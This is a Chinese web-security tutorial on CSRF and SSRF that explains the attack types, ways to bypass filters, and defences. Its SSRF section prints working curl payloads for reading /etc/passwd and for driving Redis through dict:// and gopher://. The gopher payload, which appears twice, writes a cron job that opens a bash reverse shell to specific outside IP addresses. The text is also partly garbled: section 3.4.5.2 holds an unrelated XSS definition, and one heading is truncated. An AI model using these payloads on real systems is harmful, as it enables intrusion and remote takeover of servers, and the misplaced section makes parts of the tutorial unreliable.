# WEB安全渗透测试基础知识（七）

**3.3. CSRF漏洞**

3.3.1. 简介
CSRF（Cross-site request forgery）跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。

------------

3.3.2. 分类
3.3.2.1. 资源包含
资源包含是在大多数介绍CSRF概念的演示或基础课程中可能看到的类型。这种类型归结为控制HTML标签```
（例如<image>、<audio>、<video>、<object>、<script>等）
```所包含的资源的攻击者。如果攻击者能够影响URL被加载的话，包含远程资源的任何标签都可以完成攻击。  
由于缺少对Cookie的源点检查，如上所述，此攻击不需要XSS，可以由任何攻击者控制的站点或站点本身执行。此类型仅限于GET请求，因为这些是浏览器对资源URL唯一的请求类型。这种类型的主要限制是它需要错误地使用安全的HTTP请求方式。

3.3.2.2. 基于表单
通常在正确使用安全的请求方式时看到。攻击者创建一个想要受害者提交的表单; 其包含一个JavaScript片段，强制受害者的浏览器提交。  
该表单可以完全由隐藏的元素组成，以致受害者很难发现它。 
如果处理cookies不当，攻击者可以在任何站点上发动攻击，只要受害者使用有效的cookie登录，攻击就会成功。如果请求是有目的性的，成功的攻击将使受害者回到他们平时正常的页面。该方法对于攻击者可以将受害者指向特定页面的网络钓鱼攻击特别有效。

3.3.2.3. XMLHttpRequest
这可能是最少看到的方式。  
由于许多现代Web应用程序依赖XHR，许多应用花费大量的时间来构建和实现这一特定的对策。  
基于XHR的CSRF通常由于SOP而以XSS有效载荷的形式出现。没有跨域资源共享策略（CORS），XHR仅限于攻击者托管自己的有效载荷的原始请求。  
这种类型的CSRF的攻击有效载荷基本上是一个标准的XHR，攻击者已经找到了一些注入受害者浏览器DOM的方式。

------------

3.3.3. 防御
通过CSRF-token或者验证码来检测用户提交
验证Referer/Content-Type
对于用户修改删除等操作最好都使用POST操作
避免全站通用的cookie，严格设置cookie的域

------------

**3.4. SSRF漏洞**

3.4.1. 简介
服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。

------------

3.4.2. 漏洞危害
SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。  
内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。


------------

3.4.3. 利用方式
SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的绕过方式。  
以curl为例, 可以使用dict protocol操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下：  
curl -vvv 'dict://127.0.0.1:6379/info'  
curl -vvv 'file:///etc/passwd'  
    # * 注意: 链接使用单引号，避免$变量问题
    
curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/6789 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'


------------

3.4.4. 相关危险函数
SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以PHP为例，涉及到的函数有 file_get_contents() / fsockopen() / curl_exec() 等。

3.4.5. 过滤绕过

3.4.5.1. 更改IP地址写法
一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式：  
^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$ 
^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$
^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$

对于这种过滤我们采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成：
8进制格式：0300.0250.0.1
16进制格式：0xC0.0xA8.0.1
10进制整数格式：3232235521
16进制整数格式：0xC0A80001

还有一种特殊的省略模式，例如10.0.0.1这个IP可以写成10.1。  访问改写后的IP地址时，Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作。  另外，0.0.0.0这个IP可以直接访问到本地，也通常被正则过滤遗漏。

3.4.5.2. 使用解析到内网的域名
XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了不在预期过程中的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。

3.4.5.3. 利用解析URL所出现的问题
在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。  
比如 http://www.baidu.com@192.168.0.1/ 当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是www.baidu.com，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为www.baidu.com，而实际上这个URL所请求的内容都是192.168.0.1上的内容。

3.4.5.4. 利用跳转
如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。  
可以使用如 http://httpbin.org/redirect-to?url=http://192.168.0.1 等服务跳转，但是由于URL中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。  
常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会。

.4.5.5. 通过各种非HTTP协议
如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。  
比如通过gopher，可以在一个url参数中构造POST或者GET请求，从而达到攻击内网应用的目的。例如可以使用gopher协议对与内网的Redis服务进行攻击，可以使用如下的URL：

gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i >& /dev/tcp/172.19.23.228/23330>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a

除了gopher协议，File协议也是SSRF中常用的协议，该协议主要用于访问本地计算机中的文件，我们可以通过类似 file:///path/to/file 这种格式来访问计算机本地文件。使用file协议可以避免服务端程序对于所访问的IP进行的过滤。例如我们可以通过 file:///d:/1.txt 来访问D盘中1.txt的内容。

3.4.5.6. DNS Rebinding
一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。  
但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击。  
要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：
服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP
对于获得的IP进行判断，发现为非黑名单IP，则通过验证
服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。
由于已经绕过验证，所以服务器端返回访问内网资源的结果。


3.4.5.7. 利用IPv6
有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 [::] 0000::1或IPv6的内网域名来绕过过滤。
3.4.5.8. 利用IDN
一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。  
在这些字符中，部分字符会在访问时做一个等价转换，例如 ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ 和 example.com 等同。利用这种方式，可以用 ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ 等字符绕过内网限制。


------------

3.4.6. 可能的利用点
ftp、ftps （FTP爆破）
sftp
tftp（UDP协议扩展）
dict
gopher
ldap
imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）
rtsp – smb/smbs（连接SMB）
telnet
http、https
mongodb
ShellShock命令执行
JBOSS远程Invoker war命令执行
Java调试接口命令执行
axis2-admin部署Server命令执行
Jenkins Scripts接口命令执行
Confluence SSRF
Struts2 命令执行
counchdb WEB API远程命令执行
docker API远程命令执行
php_fpm/fastcgi 命令执行
tomcat命令执行
Elasticsearch引擎Groovy脚本命令执行
WebDav PUT上传任意文件
WebSphere Admin可部署war间接命令执行
Apache Hadoop远程命令执行
zentoPMS远程命令执行
HFS远程命令执行
glassfish任意文件读取和war文件部署间接命令执行

------------

3.4.7. 防御方式
过滤返回的信息
统一错误信息
限制请求的端口
禁止不常用的协议
对DNS Rebinding，考虑使用DNS缓存或者Host白名单